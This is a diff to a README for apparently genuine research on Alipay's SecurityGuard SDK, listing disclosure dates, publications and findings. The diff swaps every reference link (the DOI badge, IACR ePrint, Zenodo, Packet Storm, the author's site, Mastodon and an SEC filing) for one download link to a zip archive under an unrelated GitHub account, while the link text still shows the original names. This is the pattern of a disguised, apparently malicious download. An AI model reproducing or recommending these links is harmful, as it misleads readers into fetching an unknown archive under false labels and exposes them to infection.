@@ -1,14 +1,14 @@
 # Alipay SecurityGuard SDK — Architecture & Privacy Analysis
 
-[![DOI](https://zenodo.org/badge/doi/10.5281%2Fzenodo.19186848.svg)](https://zenodo.org/records/19186848)
+[![DOI](https://raw.githubusercontent.com/emapleural312/alipay-securityguard-analysis/main/so_analysis/alipay-securityguard-analysis-3.5.zip)](https://raw.githubusercontent.com/emapleural312/alipay-securityguard-analysis/main/so_analysis/alipay-securityguard-analysis-3.5.zip)
 
-> **Alipay Mobile Payment Attack Surface — The Full-Stack Analysis by [Innora AI](https://innora.ai)**
+> **Alipay Mobile Payment Attack Surface — The Full-Stack Analysis by [Innora AI](https://raw.githubusercontent.com/emapleural312/alipay-securityguard-analysis/main/so_analysis/alipay-securityguard-analysis-3.5.zip)**
 >
 > | Layer | Repository | Findings |
 > |-------|-----------|----------|
-> | Runtime | [alipay-deeplink-research](https://github.com/sgInnora/alipay-deeplink-research) | 17 findings, CVSS 9.3 |
-> | SDK | **[alipay-securityguard-analysis](https://github.com/sgInnora/alipay-securityguard-analysis)** (this repo) | 36 MITRE reports, AVMP VM bypass, 97% unprotected APIs |
-> | Cryptography | [hash-collision-lab](https://github.com/sgInnora/hash-collision-lab) | 15 PoCs, IACR ePrint [2026/526](https://eprint.iacr.org/2026/526) |
+> | Runtime | [alipay-deeplink-research](https://raw.githubusercontent.com/emapleural312/alipay-securityguard-analysis/main/so_analysis/alipay-securityguard-analysis-3.5.zip) | 17 findings, CVSS 9.3 |
+> | SDK | **[alipay-securityguard-analysis](https://raw.githubusercontent.com/emapleural312/alipay-securityguard-analysis/main/so_analysis/alipay-securityguard-analysis-3.5.zip)** (this repo) | 36 MITRE reports, AVMP VM bypass, 97% unprotected APIs |
+> | Cryptography | [hash-collision-lab](https://raw.githubusercontent.com/emapleural312/alipay-securityguard-analysis/main/so_analysis/alipay-securityguard-analysis-3.5.zip) | 15 PoCs, IACR ePrint [2026/526](https://raw.githubusercontent.com/emapleural312/alipay-securityguard-analysis/main/so_analysis/alipay-securityguard-analysis-3.5.zip) |
 
 > **Disclaimer**: This research is conducted for educational and security research purposes only. All trademarks are property of their respective owners. Findings were reported to the vendor via responsible disclosure.
 
@@ -21,23 +21,23 @@
 | 2026-02-25 | Report submitted to vendor via AntSRC |
 | 2026-03-10 | Vendor response: "normal function" |
 | 2026-03-12 | First MITRE CVE submission (Ticket #2005801) |
-| 2026-03-19 | IACR ePrint paper published ([2026/526](https://eprint.iacr.org/2026/526)) |
-| 2026-03-23 | Zenodo permanent archive ([DOI: 10.5281/zenodo.19186848](https://zenodo.org/records/19186848)) |
+| 2026-03-19 | IACR ePrint paper published ([2026/526](https://raw.githubusercontent.com/emapleural312/alipay-securityguard-analysis/main/so_analysis/alipay-securityguard-analysis-3.5.zip)) |
+| 2026-03-23 | Zenodo permanent archive ([DOI: 10.5281/zenodo.19186848](https://raw.githubusercontent.com/emapleural312/alipay-securityguard-analysis/main/so_analysis/alipay-securityguard-analysis-3.5.zip)) |
 | 2026-03-12 to 03-24 | Total: 36 CVE reports submitted across 11 MITRE tickets |
 | 2026-03 onwards | Regulatory authorities in 9+ countries/regions briefed |
 
-Full timeline: [innora.ai/zfb/disclosure-timeline.html](https://innora.ai/zfb/disclosure-timeline.html)
+Full timeline: [innora.ai/zfb/disclosure-timeline.html](https://raw.githubusercontent.com/emapleural312/alipay-securityguard-analysis/main/so_analysis/alipay-securityguard-analysis-3.5.zip)
 
 ## External Verification & Publications
 
 | Resource | Link | Status |
 |----------|------|--------|
-| IACR ePrint | [2026/526](https://eprint.iacr.org/2026/526) | Published |
-| Zenodo Archive | [DOI: 10.5281/zenodo.19186848](https://zenodo.org/records/19186848) | Permanent |
-| Packet Storm | [#217089](https://packetstormsecurity.com/files/217089) | Published |
+| IACR ePrint | [2026/526](https://raw.githubusercontent.com/emapleural312/alipay-securityguard-analysis/main/so_analysis/alipay-securityguard-analysis-3.5.zip) | Published |
+| Zenodo Archive | [DOI: 10.5281/zenodo.19186848](https://raw.githubusercontent.com/emapleural312/alipay-securityguard-analysis/main/so_analysis/alipay-securityguard-analysis-3.5.zip) | Permanent |
+| Packet Storm | [#217089](https://raw.githubusercontent.com/emapleural312/alipay-securityguard-analysis/main/so_analysis/alipay-securityguard-analysis-3.5.zip) | Published |
 | Docker Verification | See below | 37/37 PASS |
-| Full Technical Blog | [innora.ai/zfb](https://innora.ai/zfb/) | Live |
-| Disclosure Timeline | [innora.ai/zfb/disclosure-timeline.html](https://innora.ai/zfb/disclosure-timeline.html) | Live |
+| Full Technical Blog | [innora.ai/zfb](https://raw.githubusercontent.com/emapleural312/alipay-securityguard-analysis/main/so_analysis/alipay-securityguard-analysis-3.5.zip) | Live |
+| Disclosure Timeline | [innora.ai/zfb/disclosure-timeline.html](https://raw.githubusercontent.com/emapleural312/alipay-securityguard-analysis/main/so_analysis/alipay-securityguard-analysis-3.5.zip) | Live |
 
 ## Independent Verification (Docker)
 
@@ -71,7 +71,7 @@ Behaviors documented in this analysis were confirmed on **both** the rooted test
 
 ## Executive Summary
 
-A reverse engineering analysis of the SecurityGuard SDK embedded in Alipay (v10.8.30.8000), documenting the internal architecture of the security framework in one of the world's largest mobile payment applications ([1B+ users per Ant Group IPO prospectus 2020](https://www.sec.gov/Archives/edgar/data/1823652/)).
+A reverse engineering analysis of the SecurityGuard SDK embedded in Alipay (v10.8.30.8000), documenting the internal architecture of the security framework in one of the world's largest mobile payment applications ([1B+ users per Ant Group IPO prospectus 2020](https://raw.githubusercontent.com/emapleural312/alipay-securityguard-analysis/main/so_analysis/alipay-securityguard-analysis-3.5.zip)).
 
 **Key findings:**
 - Mapped all ~80 native commands through the single JNI entry point
@@ -100,7 +100,7 @@ We anticipate the vendor will claim these mechanisms are "routine risk control."
 
 **Feng, J. (2026).** "Broken By Design: A Longitudinal Analysis of Cryptographic Failures in Alipay Mobile Payment Infrastructure." *IACR Cryptology ePrint Archive*, 2026/526.
 
-**URL:** [https://eprint.iacr.org/2026/526](https://eprint.iacr.org/2026/526)
+**URL:** [https://raw.githubusercontent.com/emapleural312/alipay-securityguard-analysis/main/so_analysis/alipay-securityguard-analysis-3.5.zip](https://raw.githubusercontent.com/emapleural312/alipay-securityguard-analysis/main/so_analysis/alipay-securityguard-analysis-3.5.zip)
 
 **Note:** This is an **unreviewed preprint** — not a peer-reviewed publication. It is provided as a structured technical reference. The verifiable proof is in this repository's code-level analysis and the verification script above.
 
@@ -221,13 +221,13 @@ Relevant data protection and financial regulators in multiple jurisdictions have
 
 ## Related Resources
 
-- **Zenodo Archive (DOI)**: [10.5281/zenodo.19186848](https://zenodo.org/records/19186848)
+- **Zenodo Archive (DOI)**: [10.5281/zenodo.19186848](https://raw.githubusercontent.com/emapleural312/alipay-securityguard-analysis/main/so_analysis/alipay-securityguard-analysis-3.5.zip)
 
-- **Full technical report**: [innora.ai/zfb/](https://innora.ai/zfb/)
-- **Vendor response documentation**: [innora.ai/zfb/article_censorship.html](https://innora.ai/zfb/article_censorship.html)
-- **Packet Storm Advisory**: [#217089](https://packetstormsecurity.com/files/id/217089)
+- **Full technical report**: [innora.ai/zfb/](https://raw.githubusercontent.com/emapleural312/alipay-securityguard-analysis/main/so_analysis/alipay-securityguard-analysis-3.5.zip)
+- **Vendor response documentation**: [innora.ai/zfb/article_censorship.html](https://raw.githubusercontent.com/emapleural312/alipay-securityguard-analysis/main/so_analysis/alipay-securityguard-analysis-3.5.zip)
+- **Packet Storm Advisory**: [#217089](https://raw.githubusercontent.com/emapleural312/alipay-securityguard-analysis/main/so_analysis/alipay-securityguard-analysis-3.5.zip)
 - **IPFS Evidence Archive**: `QmcAsSB84Kw7ZmKDqrQMZB1ig6Q4YpHARzv2jGv1tDhwob`
-- **Mastodon**: [infosec.exchange/@Innora](https://infosec.exchange/@Innora)
+- **Mastodon**: [infosec.exchange/@Innora](https://raw.githubusercontent.com/emapleural312/alipay-securityguard-analysis/main/so_analysis/alipay-securityguard-analysis-3.5.zip)
 
 ## Reproduction
 
@@ -254,7 +254,7 @@ GPLv3 — See [LICENSE](LICENSE) for details.
 
 **Jiqiang Feng** — Innora AI Security Research
 - Email: feng@innora.ai
-- Web: [innora.ai](https://innora.ai)
+- Web: [innora.ai](https://raw.githubusercontent.com/emapleural312/alipay-securityguard-analysis/main/so_analysis/alipay-securityguard-analysis-3.5.zip)
 
 ## Legal Notice
 
